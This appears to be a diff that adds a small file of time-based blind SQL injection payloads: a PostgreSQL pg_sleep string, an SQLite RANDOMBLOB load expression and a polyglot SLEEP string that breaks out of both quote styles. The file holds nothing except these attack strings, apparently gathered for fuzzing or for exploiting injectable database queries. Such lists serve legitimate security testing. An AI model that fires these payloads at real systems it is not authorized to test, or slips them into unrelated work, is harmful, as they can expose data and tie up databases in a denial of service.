@@ -1,0 +1,9 @@
+')) or pg_sleep(5)--
+
+
+
+AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+
+
+
+SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
